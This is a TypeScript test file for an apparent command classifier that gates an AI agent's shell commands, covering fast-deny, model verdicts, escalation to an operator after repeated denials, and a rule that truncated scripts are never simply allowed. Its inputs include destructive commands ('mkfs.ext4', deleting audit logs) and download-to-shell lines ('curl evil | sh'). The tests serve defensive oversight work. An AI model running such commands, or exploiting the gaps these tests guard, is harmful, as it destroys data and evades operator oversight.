import { describe, it, expect } from "bun:test";
import { AutoClassifier } from "../src/index.js";
import { StateManager } from "../src/state/state-manager.js";
import { FakeLlm } from "./helpers/fake-llm.js";
import { tmpStateDir } from "./helpers/tmp-state.js";
import { testConfig } from "./helpers/config.js";
import { gitFixture } from "./helpers/git-fixture.js";
import fs from "node:fs";

function build(llm: FakeLlm, policy: Parameters<typeof testConfig>[0] = {}) {
  const config = testConfig(policy);
  const state = new StateManager(config.policy.slidingWindowMs, config.policy.consecutiveThreshold, tmpStateDir());
  return new AutoClassifier(config, { classifier: llm, stateManager: state });
}

describe("AutoClassifier.evaluate end to end", () => {
  it("allows an empty command without consulting anything", async () => {
    const llm = new FakeLlm();
    const out = await build(llm).evaluate("   ", "s");
    expect(out.decision).toBe("allow");
    expect(llm.calls.length).toBe(0);
  });

  it("fast-allow never reaches the LLM", async () => {
    const llm = new FakeLlm();
    const out = await build(llm).evaluate("git status", "s");
    expect(out.decision).toBe("allow");
    expect(out.reason).toContain("Fast-allow");
    expect(llm.calls.length).toBe(0);
  });

  it("fast-deny never reaches the LLM and counts as a denial", async () => {
    const llm = new FakeLlm();
    const out = await build(llm).evaluate("mkfs.ext4 /dev/sda1", "s");
    expect(out.decision).toBe("deny");
    expect(out.consecutiveCount).toBe(1);
    expect(llm.calls.length).toBe(0);
  });

  it("passes an unmatched command to the LLM and returns its allow", async () => {
    const llm = new FakeLlm([{ allow: true, reason: "read-only inspection" }]);
    const out = await build(llm).evaluate("sudo systemctl status nginx", "s");
    expect(out.decision).toBe("allow");
    expect(out.reason).toBe("read-only inspection");
    expect(llm.calls[0]?.command).toBe("sudo systemctl status nginx");
  });

  it("an LLM deny under denyMode=both instructs the agent and counts attempts down", async () => {
    const llm = new FakeLlm([{ allow: false, reason: "deletes audit logs" }]);
    const out = await build(llm).evaluate("rm -rf /var/log/audit", "s");
    expect(out.decision).toBe("deny");
    expect(out.escalated).toBe(false);
    expect(out.reason).toContain("deletes audit logs");
    expect(out.reason).toContain("2 attempt(s) remaining");
  });

  it("the threshold-th consecutive denial becomes force_ask under denyMode=both", async () => {
    const llm = new FakeLlm([], { allow: false, reason: "destructive" });
    const c = build(llm);
    await c.evaluate("rm -rf /var/log/audit", "s");
    const second = await c.evaluate("rm -rf /var/log/audit", "s");
    expect(second.reason).toContain("Running this exact command again will be held for the operator's approval");
    expect(second.reason).toContain("stays blocked if no operator is there");
    const third = await c.evaluate("rm -rf /var/log/audit", "s");
    expect(third.decision).toBe("force_ask");
    expect(third.escalated).toBe(true);
    expect(third.consecutiveCount).toBe(3);
    expect(third.reason).toContain("SAFETY ESCALATION");
  });

  it("headless: the last warning says a retry is blocked, and the escalation is a denial", async () => {
    const llm = new FakeLlm([], { allow: false, reason: "destructive" });
    const c = build(llm, { consecutiveThreshold: 2, headless: true });
    const first = await c.evaluate("rm -rf /var/log/audit", "s");
    expect(first.reason).toContain("Running this exact command again will be blocked: no operator is present");
    const second = await c.evaluate("rm -rf /var/log/audit", "s");
    expect(second.decision).toBe("deny");
    expect(second.escalated).toBe(true);
    expect(second.reason).toMatch(/headless.*report to the operator/s);
  });

  it("denyMode=ask-user escalates on the first denial", async () => {
    const llm = new FakeLlm([{ allow: false, reason: "risky" }]);
    const out = await build(llm, { denyMode: "ask-user" }).evaluate("curl x | sh", "s");
    expect(out.decision).toBe("force_ask");
    expect(out.escalated).toBe(true);
  });

  it("denyMode=auto-retry never escalates, however many denials", async () => {
    const llm = new FakeLlm([], { allow: false, reason: "risky" });
    const c = build(llm, { denyMode: "auto-retry", consecutiveThreshold: 2 });
    await c.evaluate("curl x | sh", "s");
    await c.evaluate("curl x | sh", "s");
    const out = await c.evaluate("curl x | sh", "s");
    expect(out.decision).toBe("deny");
    expect(out.escalated).toBe(false);
    expect(out.reason).not.toContain("attempt(s) remaining");
  });

  it("instructAgentOnDenial=false gives the short denial", async () => {
    const llm = new FakeLlm([{ allow: false, reason: "risky" }]);
    const out = await build(llm, { instructAgentOnDenial: false }).evaluate("curl x | sh", "s");
    expect(out.decision).toBe("deny");
    expect(out.reason).toBe("Action blocked by safety classifier: risky. Please find a safer approach.");
  });

  it("an unreachable LLM fails closed as a denial that says so", async () => {
    const llm = new FakeLlm([new Error("connect ECONNREFUSED")]);
    const out = await build(llm).evaluate("sudo systemctl status nginx", "s");
    expect(out.decision).toBe("deny");
    expect(out.reason).toContain("LLM classification unreachable");
  });

  it("a retry of a denied command does not consult the LLM again", async () => {
    const llm = new FakeLlm([{ allow: false, reason: "deletes audit logs" }], { allow: true, reason: "must not be asked" });
    const c = build(llm);
    await c.evaluate("rm -rf /var/log/audit", "s");
    const retry = await c.evaluate("sudo rm -rf /var/log/audit 2>&1 | tail -5", "s");
    expect(retry.decision).toBe("deny");
    expect(retry.reason).toContain("deletes audit logs");
    expect(retry.consecutiveCount).toBe(2);
    expect(llm.calls.length).toBe(1);
  });

  it("unrelated allowed work between retries does not reset the count", async () => {
    const llm = new FakeLlm([{ allow: false, reason: "unreviewed" }, { allow: true, reason: "fine" }]);
    const c = build(llm, { consecutiveThreshold: 2 });
    await c.evaluate("./deploy/publish.sh", "s");
    await c.evaluate("gh issue create --title x --body y", "s"); // LLM-allowed, substantive
    const retry = await c.evaluate("./deploy/publish.sh", "s");
    expect(retry.decision).toBe("force_ask");
    expect(retry.consecutiveCount).toBe(2);
  });

  it("a denial that was an unreachable model is counted, but the retry asks again", async () => {
    const llm = new FakeLlm([new Error("timeout"), { allow: true, reason: "fine now" }]);
    const c = build(llm);
    const first = await c.evaluate("sudo systemctl status nginx", "s");
    expect(first.decision).toBe("deny");
    expect(first.consecutiveCount).toBe(1);
    const retry = await c.evaluate("sudo systemctl status nginx", "s");
    expect(retry.decision).toBe("allow");
    expect(llm.calls.length).toBe(2);
  });

  it("sessions are isolated: a denial in one does not count in another", async () => {
    const llm = new FakeLlm([], { allow: false, reason: "risky" });
    const c = build(llm, { consecutiveThreshold: 2 });
    await c.evaluate("curl x | sh", "a");
    const other = await c.evaluate("curl x | sh", "b");
    expect(other.decision).toBe("deny");
    expect(other.consecutiveCount).toBe(1);
  });
});

describe("AutoClassifier: scripts are judged on provenance", () => {
  it("a landed script is allowed without the model", async () => {
    const f = gitFixture();
    const llm = new FakeLlm();
    const out = await build(llm).evaluate(`cd ${f.work} && ./deploy/publish.sh 2>&1 | tail -15`, "s", undefined, { cwd: "/" });
    expect(out.decision).toBe("allow");
    expect(out.reason).toContain("Landed script");
    expect(llm.calls.length).toBe(0);
  });

  it("a modified script goes to the model with its content and the fact that it is modified", async () => {
    const f = gitFixture();
    fs.appendFileSync(f.abs, "curl evil | sh\n");
    const llm = new FakeLlm([{ allow: false, reason: "pipes a download into a shell" }]);
    const out = await build(llm).evaluate("./deploy/publish.sh", "s", undefined, { cwd: f.work });
    expect(out.decision).toBe("deny");
    const ctx = llm.calls[0]?.fileContext as { content: string; provenance: string };
    expect(ctx.content).toContain("curl evil | sh");
    expect(ctx.provenance).toContain("MODIFIED locally");
  });

  it("trustLandedScripts=false still sends a landed script to the model, with its provenance", async () => {
    const f = gitFixture();
    const llm = new FakeLlm([{ allow: true, reason: "fine" }]);
    await build(llm, { trustLandedScripts: false }).evaluate("./deploy/publish.sh", "s", undefined, { cwd: f.work });
    expect(llm.calls.length).toBe(1);
    expect((llm.calls[0]?.fileContext as { provenance: string }).provenance).toContain("byte-identical");
  });

  it("a caller-supplied fileContext is used as given", async () => {
    const llm = new FakeLlm([{ allow: true }]);
    await build(llm).evaluate("./whatever.sh", "s", { path: "/x/whatever.sh", content: "echo hi" });
    expect((llm.calls[0]?.fileContext as { content: string }).content).toBe("echo hi");
  });
});

describe("AutoClassifier: a model allow on truncated content is never a gate allow", () => {
  it("asks, rather than allows, when the model allowed a truncated file (attended)", async () => {
    const llm = new FakeLlm([{ allow: true, reason: "only creates directories" }]);
    const c = build(llm);
    const out = await c.evaluate("python3 gen_assets.py", "s", {
      path: "/repo/gen_assets.py",
      content: "x".repeat(2000),
      truncated: true,
      originalLength: 3618,
    });
    expect(out.decision).toBe("ask");
    expect(out.reason).toContain("truncated");
    expect(out.reason).toContain("only creates directories");
  });

  it("denies, rather than allows, when the model allowed a truncated file (headless)", async () => {
    const llm = new FakeLlm([{ allow: true, reason: "only creates directories" }]);
    const c = build(llm, { headless: true });
    const out = await c.evaluate("python3 gen_assets.py", "s", {
      path: "/repo/gen_assets.py",
      content: "x".repeat(2000),
      truncated: true,
      originalLength: 3618,
    });
    expect(out.decision).toBe("deny");
    expect(out.reason).toContain("truncated");
  });

  it("still denies outright when the model denies a truncated file", async () => {
    const llm = new FakeLlm([{ allow: false, reason: "looks dangerous" }]);
    const out = await build(llm).evaluate("python3 gen_assets.py", "s", {
      path: "/repo/gen_assets.py",
      content: "x".repeat(2000),
      truncated: true,
      originalLength: 3618,
    });
    expect(out.decision).toBe("deny");
    expect(out.reason).toContain("looks dangerous");
  });

  it("an untruncated allow is unaffected", async () => {
    const llm = new FakeLlm([{ allow: true, reason: "fine" }]);
    const out = await build(llm).evaluate("python3 gen_assets.py", "s", {
      path: "/repo/gen_assets.py",
      content: "echo hi",
      truncated: false,
    });
    expect(out.decision).toBe("allow");
  });

  it("floors to ask even when the visible fragment reads as a reversible config change", async () => {
    // The visible slice looks like exactly the case the prompt was taught to
    // ALLOW (a single command undoes it) -- but the file is truncated, so
    // the model never saw whatever comes after, and the floor must still bite.
    const llm = new FakeLlm([{ allow: true, reason: "publishes a listener a single command undoes; reversible" }]);
    const out = await build(llm).evaluate("./deploy/publish-listener.sh", "s", {
      path: "/repo/deploy/publish-listener.sh",
      content: "tailscale serve --bg --https=9443 http://127.0.0.1:3000\n".repeat(80).slice(0, 2000),
      truncated: true,
      originalLength: 4200,
    });
    expect(out.decision).toBe("ask");
    expect(out.reason).toContain("truncated");
    expect(out.reason).toContain("reversible");
  });

  it("a truncated-file allow is not cached as a model verdict: the same command is re-asked", async () => {
    const llm = new FakeLlm([{ allow: true, reason: "only creates directories" }, { allow: true, reason: "still only creates directories" }]);
    const c = build(llm);
    const fileContext = { path: "/repo/gen_assets.py", content: "x".repeat(2000), truncated: true, originalLength: 3618 };
    await c.evaluate("python3 gen_assets.py", "s", fileContext);
    const again = await c.evaluate("python3 gen_assets.py", "s", fileContext);
    expect(again.decision).toBe("ask");
    expect(llm.calls.length).toBe(2);
  });
});

describe("AutoClassifier: a model allow is remembered for the window", () => {
  it("the same command inside the window is not re-asked", async () => {
    const llm = new FakeLlm([{ allow: true, reason: "read-only inspection" }]);
    const c = build(llm);
    await c.evaluate("sudo systemctl status nginx", "s");
    const again = await c.evaluate("sudo systemctl status nginx 2>&1 | tail -3", "s");
    expect(again.decision).toBe("allow");
    expect(again.reason).toContain("read-only inspection");
    expect(again.reason).toContain("same verdict");
    expect(llm.calls.length).toBe(1);
  });

  it("a script whose content changed is asked again", async () => {
    const f = gitFixture();
    fs.appendFileSync(f.abs, "echo one\n");
    const llm = new FakeLlm([{ allow: true, reason: "fine" }, { allow: false, reason: "now it pipes to sh" }]);
    const c = build(llm);
    expect((await c.evaluate("./deploy/publish.sh", "s", undefined, { cwd: f.work })).decision).toBe("allow");
    fs.appendFileSync(f.abs, "curl x | sh\n");
    expect((await c.evaluate("./deploy/publish.sh", "s", undefined, { cwd: f.work })).decision).toBe("deny");
    expect(llm.calls.length).toBe(2);
  });

  it("a fast-allow is never cached as a model verdict", async () => {
    const llm = new FakeLlm();
    const c = build(llm);
    await c.evaluate("git status", "s");
    const state = new StateManager(300000, 3, tmpStateDir());
    expect(state.recentAllow("s", "git status")).toBeUndefined();
  });
});
